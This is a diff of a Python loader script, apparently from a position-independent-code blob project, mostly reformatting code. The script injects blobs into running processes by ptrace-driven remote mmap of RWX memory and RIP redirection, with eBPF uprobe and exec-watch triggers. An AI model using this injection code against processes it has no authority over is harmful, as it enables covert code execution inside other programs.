@@ -48,9 +48,7 @@ Usage:
 from __future__ import annotations
 
 import argparse
-import ctypes
 import os
-import struct
 import sys
 import time
 from pathlib import Path
@@ -61,9 +59,8 @@ from pathlib import Path
 PROJECT_ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(PROJECT_ROOT / "python"))
 
-from picblobs import get_blob, BlobData
+from picblobs import BlobData, get_blob
 from picblobs._extractor import extract
-
 
 # ===========================================================================
 # eBPF C programs (loaded by BCC at runtime)
@@ -177,8 +174,9 @@ MAP_FIXED = 0x10
 DEFAULT_LOAD_ADDR = 0x7F_0000_0000  # ~508 GB, within user range on x86_64
 
 
-def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
-                        load_addr: int = DEFAULT_LOAD_ADDR) -> int:
+def inject_blob_procmem(
+    pid: int, blob: BlobData, config: bytes = b"", load_addr: int = DEFAULT_LOAD_ADDR
+) -> int:
     """Inject a PIC blob into a target process via /proc/<pid>/mem.
 
     Strategy:
@@ -195,7 +193,6 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
     Returns:
         The address where the blob was loaded.
     """
-    import ctypes
     import ctypes.util
 
     libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
@@ -206,7 +203,6 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
     PTRACE_SETREGS = 13
     PTRACE_POKETEXT = 4
     PTRACE_PEEKTEXT = 3
-    PTRACE_SYSCALL = 24
     PTRACE_CONT = 7
 
     # x86_64 register struct (struct user_regs_struct from sys/user.h)
@@ -245,7 +241,7 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
     payload = bytearray(blob.code)
     if config:
         offset = blob.config_offset
-        payload[offset:offset + len(config)] = config
+        payload[offset : offset + len(config)] = config
 
     payload_bytes = bytes(payload)
     payload_size = len(payload_bytes)
@@ -268,7 +264,7 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
 
     # Wait for SIGSTOP
     os.waitpid(pid, 0)
-    print(f"[+] Attached, process stopped")
+    print("[+] Attached, process stopped")
 
     try:
         # --- Step 2: Save registers ---
@@ -277,7 +273,6 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
         if ret < 0:
             raise OSError(ctypes.get_errno(), "ptrace(GETREGS) failed")
         saved_rip = regs.rip
-        saved_rax = regs.rax
         print(f"[*] Saved RIP: {saved_rip:#018x}")
 
         # --- Step 3: Inject mmap syscall ---
@@ -294,16 +289,17 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
 
         # Set up registers for: mmap(load_addr, alloc_size, RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
         mmap_regs = UserRegs()
-        ctypes.memmove(ctypes.byref(mmap_regs), ctypes.byref(regs),
-                       ctypes.sizeof(UserRegs))
-        mmap_regs.rax = 9           # __NR_mmap
-        mmap_regs.rdi = load_addr   # addr (hint)
+        ctypes.memmove(
+            ctypes.byref(mmap_regs), ctypes.byref(regs), ctypes.sizeof(UserRegs)
+        )
+        mmap_regs.rax = 9  # __NR_mmap
+        mmap_regs.rdi = load_addr  # addr (hint)
         mmap_regs.rsi = alloc_size  # length
         mmap_regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC  # prot
-        mmap_regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS          # flags
-        mmap_regs.r8 = 0xFFFFFFFFFFFFFFFF                    # fd = -1
-        mmap_regs.r9 = 0                                     # offset
-        mmap_regs.rip = saved_rip   # points at our syscall;int3
+        mmap_regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS  # flags
+        mmap_regs.r8 = 0xFFFFFFFFFFFFFFFF  # fd = -1
+        mmap_regs.r9 = 0  # offset
+        mmap_regs.rip = saved_rip  # points at our syscall;int3
 
         libc.ptrace(PTRACE_SETREGS, pid, 0, ctypes.byref(mmap_regs))
         libc.ptrace(PTRACE_CONT, pid, 0, 0)
@@ -314,7 +310,9 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
         libc.ptrace(PTRACE_GETREGS, pid, 0, ctypes.byref(result_regs))
         mmap_addr = result_regs.rax
         if mmap_addr > 0xFFFFFFFFFFFF0000:  # negative = error
-            raise RuntimeError(f"Remote mmap failed: {-(mmap_addr & 0xFFFFFFFFFFFFFFFF)}")
+            raise RuntimeError(
+                f"Remote mmap failed: {-(mmap_addr & 0xFFFFFFFFFFFFFFFF)}"
+            )
         print(f"[+] Remote mmap at {mmap_addr:#018x} ({alloc_size} bytes RWX)")
 
         # Restore original bytes at saved_rip
@@ -329,8 +327,9 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
 
         # --- Step 5: Redirect execution to blob ---
         exec_regs = UserRegs()
-        ctypes.memmove(ctypes.byref(exec_regs), ctypes.byref(regs),
-                       ctypes.sizeof(UserRegs))
+        ctypes.memmove(
+            ctypes.byref(exec_regs), ctypes.byref(regs), ctypes.sizeof(UserRegs)
+        )
         exec_regs.rip = mmap_addr + blob.entry_offset
         exec_regs.rax = 0  # clear
         exec_regs.rdx = 0  # clear (ld.so uses this)
@@ -350,14 +349,19 @@ def inject_blob_procmem(pid: int, blob: BlobData, config: bytes = b"",
 # Mode handlers
 # ===========================================================================
 
+
 def load_blob(args) -> tuple[BlobData, bytes]:
     """Load a blob from package or direct .so path."""
     config = bytes.fromhex(args.config_hex) if args.config_hex else b""
 
     if args.so:
         print(f"[*] Loading blob from: {args.so}")
-        blob = extract(args.so, blob_type=args.blob_type,
-                       target_os=args.blob_os, target_arch=args.blob_arch)
+        blob = extract(
+            args.so,
+            blob_type=args.blob_type,
+            target_os=args.blob_os,
+            target_arch=args.blob_arch,
+        )
     else:
         print(f"[*] Loading blob: {args.blob_type}/{args.blob_os}/{args.blob_arch}")
         blob = get_blob(args.blob_type, args.blob_os, args.blob_arch)
@@ -385,7 +389,7 @@ def mode_uprobe(args):
     # Patch the target PID into the BPF source
     src = BPF_UPROBE_SRC.replace("TARGET_PID", str(pid))
 
-    print(f"\n[*] ═══ eBPF UPROBE LOADER ═══")
+    print("\n[*] ═══ eBPF UPROBE LOADER ═══")
     print(f"[*] Attaching uprobe to {library}:{symbol} in PID {pid}")
     print(f"[*] Waiting for target to call {symbol}()...\n")
 
@@ -394,10 +398,12 @@ def mode_uprobe(args):
     # Resolve library path for the uprobe
     if "/" not in library:
         import ctypes.util
+
         lib_path = ctypes.util.find_library(library)
         if lib_path:
             # find_library returns "libc.so.6", we need the full path
             import subprocess
+
             result = subprocess.run(["ldconfig", "-p"], capture_output=True, text=True)
             for line in result.stdout.splitlines():
                 if lib_path in line and "x86-64" in line:
@@ -419,10 +425,12 @@ def mode_uprobe(args):
         if injected:
             return
         event = b["events"].event(data)
-        print(f"\n[!] TRIGGER: PID {event.pid} (TID {event.tid}) hit "
-              f"{symbol}() at {event.addr:#x}")
+        print(
+            f"\n[!] TRIGGER: PID {event.pid} (TID {event.tid}) hit "
+            f"{symbol}() at {event.addr:#x}"
+        )
         print(f"[!] Process: {event.comm.decode('utf-8', errors='replace')}")
-        print(f"[*] Injecting blob...\n")
+        print("[*] Injecting blob...\n")
 
         try:
             inject_blob_procmem(event.pid, blob, config)
@@ -457,9 +465,9 @@ def mode_watch(args):
 
     src = BPF_EXEC_WATCH_SRC.replace("TARGET_COMM", comm)
 
-    print(f"\n[*] ═══ eBPF EXEC WATCH LOADER ═══")
+    print("\n[*] ═══ eBPF EXEC WATCH LOADER ═══")
     print(f"[*] Watching for exec of: {exec_path} (comm={comm})")
-    print(f"[*] Will inject blob on first match...\n")
+    print("[*] Will inject blob on first match...\n")
 
     b = BPF(text=src)
 
@@ -470,13 +478,15 @@ def mode_watch(args):
         if injected:
             return
         event = b["events"].event(data)
-        print(f"\n[!] EXEC DETECTED: PID {event.pid} exec'd "
-              f"{event.comm.decode('utf-8', errors='replace')}")
+        print(
+            f"\n[!] EXEC DETECTED: PID {event.pid} exec'd "
+            f"{event.comm.decode('utf-8', errors='replace')}"
+        )
 
         # Small delay — let the process finish initializing
         time.sleep(0.05)
 
-        print(f"[*] Injecting blob...\n")
+        print("[*] Injecting blob...\n")
         try:
             inject_blob_procmem(event.pid, blob, config)
             injected = True
@@ -500,7 +510,7 @@ def mode_inject(args):
     pid = args.pid
     blob, config = load_blob(args)
 
-    print(f"\n[*] ═══ DIRECT BLOB INJECTION ═══")
+    print("\n[*] ═══ DIRECT BLOB INJECTION ═══")
     print(f"[*] Target PID: {pid}")
     print()
 
@@ -517,18 +527,20 @@ def mode_inject(args):
 # Argument parser
 # ===========================================================================
 
+
 def add_blob_args(parser):
     """Add common blob selection arguments to a subparser."""
-    parser.add_argument("--blob-type", default="hello",
-                        help="Blob type (default: hello)")
-    parser.add_argument("--blob-os", default="linux",
-                        help="Target OS (default: linux)")
-    parser.add_argument("--blob-arch", default="x86_64",
-                        help="Target architecture (default: x86_64)")
-    parser.add_argument("--config-hex", default="",
-                        help="Config bytes as hex string")
-    parser.add_argument("--so", default="",
-                        help="Direct path to .so file (overrides blob-type/os/arch)")
+    parser.add_argument(
+        "--blob-type", default="hello", help="Blob type (default: hello)"
+    )
+    parser.add_argument("--blob-os", default="linux", help="Target OS (default: linux)")
+    parser.add_argument(
+        "--blob-arch", default="x86_64", help="Target architecture (default: x86_64)"
+    )
+    parser.add_argument("--config-hex", default="", help="Config bytes as hex string")
+    parser.add_argument(
+        "--so", default="", help="Direct path to .so file (overrides blob-type/os/arch)"
+    )
 
 
 def main():
@@ -549,33 +561,34 @@ Examples:
   # Use a specific blob .so file
   sudo python3 mbed/ebpf_loader.py inject --pid 1234 \\
       --so bazel-bin/src/payload/hello.so
-        """)
+        """,
+    )
 
     subs = parser.add_subparsers(dest="mode", required=True)
 
     # Mode 1: uprobe
-    p_uprobe = subs.add_parser("uprobe",
-        help="Attach uprobe to target function, inject on trigger")
-    p_uprobe.add_argument("--pid", type=int, required=True,
-                          help="Target process ID")
-    p_uprobe.add_argument("--symbol", default="write",
-                          help="Function symbol to probe (default: write)")
-    p_uprobe.add_argument("--library", default="c",
-                          help="Library containing symbol (default: c)")
+    p_uprobe = subs.add_parser(
+        "uprobe", help="Attach uprobe to target function, inject on trigger"
+    )
+    p_uprobe.add_argument("--pid", type=int, required=True, help="Target process ID")
+    p_uprobe.add_argument(
+        "--symbol", default="write", help="Function symbol to probe (default: write)"
+    )
+    p_uprobe.add_argument(
+        "--library", default="c", help="Library containing symbol (default: c)"
+    )
     add_blob_args(p_uprobe)
 
     # Mode 2: exec watch
-    p_watch = subs.add_parser("watch",
-        help="Watch for target exec, inject on detection")
-    p_watch.add_argument("--exec-path", required=True,
-                         help="Path to target executable")
+    p_watch = subs.add_parser(
+        "watch", help="Watch for target exec, inject on detection"
+    )
+    p_watch.add_argument("--exec-path", required=True, help="Path to target executable")
     add_blob_args(p_watch)
 
     # Mode 3: direct inject
-    p_inject = subs.add_parser("inject",
-        help="Direct injection into running process")
-    p_inject.add_argument("--pid", type=int, required=True,
-                          help="Target process ID")
+    p_inject = subs.add_parser("inject", help="Direct injection into running process")
+    p_inject.add_argument("--pid", type=int, required=True, help="Target process ID")
     add_blob_args(p_inject)
 
     args = parser.parse_args()
